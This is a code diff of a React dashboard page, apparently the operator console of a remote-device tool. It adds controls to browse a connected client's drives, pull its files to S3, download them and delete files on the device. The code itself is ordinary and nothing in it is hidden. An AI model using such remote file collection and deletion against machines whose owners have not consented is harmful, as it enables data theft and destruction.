@@ -5,6 +5,7 @@ import { Sidebar } from "../components/Sidebar";
 import { ClientDetail } from "../components/ClientDetail";
 import { DriveList } from "../components/DriveList";
 import { FileBrowser } from "../components/FileBrowser";
+import { DownloadListModal, type DownloadListItem } from "../components/DownloadListModal";
 
 const WS_URL = "wss://mac.cryptdocker.com";
 
@@ -21,10 +22,18 @@ export const Home = () => {
     browsingLoading,
     browsingError,
     browseDirectory,
+    uploadFile,
+    deleteFile,
+    getDownloadUrl,
+    uploading,
+    deleting,
+    uploadListByDeviceId,
+    requestUploadList,
   } = useWebSocket(WS_URL);
 
   const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
   const [browsing, setBrowsing] = useState(false);
+  const [downloadListClientId, setDownloadListClientId] = useState<string | null>(null);
 
   const listClient =
     clients.find((c) => c.deviceId === selectedDeviceId) ?? null;
@@ -42,6 +51,20 @@ export const Home = () => {
     requestClientDetails(deviceId);
   };
 
+  const downloadListClient =
+    clients.find((c) => c.deviceId === downloadListClientId) ??
+    (clientDetail?.deviceId === downloadListClientId ? clientDetail : null);
+
+  const downloadListItems: DownloadListItem[] = (downloadListClientId
+    ? uploadListByDeviceId[downloadListClientId] || []
+    : []
+  ).map((u) => ({
+    path: u.path,
+    name: u.path.split(/[\\/]/).filter(Boolean).pop() || u.path,
+    isDir: false,
+    s3Url: u.s3_url,
+  }));
+
   const handleDriveClick = (path: string) => {
     if (!selectedDeviceId) return;
     setBrowsing(true);
@@ -55,6 +78,38 @@ export const Home = () => {
 
   const handleBackToDrives = () => {
     setBrowsing(false);
+  };
+
+  const handleUpload = (path: string) => {
+    if (!selectedDeviceId) return;
+    uploadFile(selectedDeviceId, path);
+  };
+
+  const handleDelete = (path: string, isDir: boolean) => {
+    if (!selectedDeviceId) return;
+    deleteFile(selectedDeviceId, path, isDir);
+  };
+
+  const handleDownload = (s3Url: string) => {
+    const url = getDownloadUrl(s3Url);
+    window.open(url, "_blank");
+  };
+
+  const handleOpenDownloadList = (deviceId: string) => {
+    if (selectedDeviceId !== deviceId) {
+      handleSelectClient(deviceId);
+    }
+    setDownloadListClientId(deviceId);
+    requestUploadList(deviceId);
+  };
+
+  const handleCloseDownloadList = () => {
+    setDownloadListClientId(null);
+  };
+
+  const handleRemoveFromDownloadList = (path: string, isDir: boolean) => {
+    if (!downloadListClientId) return;
+    deleteFile(downloadListClientId, path, isDir);
   };
 
   const handleVolumesClick = () => {
@@ -73,6 +128,7 @@ export const Home = () => {
         clients={clients}
         selectedDeviceId={selectedDeviceId}
         onSelectClient={(client) => handleSelectClient(client.deviceId)}
+        onOpenDownloadList={(client) => handleOpenDownloadList(client.deviceId)}
         connected={connected}
       />
       <main className="flex-1 flex flex-col overflow-hidden">
@@ -88,8 +144,13 @@ export const Home = () => {
                   currentPath={currentPath || ""}
                   loading={browsingLoading}
                   error={browsingError}
+                  uploading={uploading}
+                  deleting={deleting}
                   onNavigate={handleNavigate}
                   onBack={handleBackToDrives}
+                  onUpload={handleUpload}
+                  onDelete={handleDelete}
+                  onDownload={handleDownload}
                 />
               ) : (
                 <DriveList
@@ -115,6 +176,15 @@ export const Home = () => {
           </div>
         )}
       </main>
+
+      <DownloadListModal
+        open={downloadListClientId != null}
+        clientName={downloadListClient?.username || "Client"}
+        items={downloadListItems}
+        onClose={handleCloseDownloadList}
+        onDownload={handleDownload}
+        onRemove={handleRemoveFromDownloadList}
+      />
     </div>
   );
 };
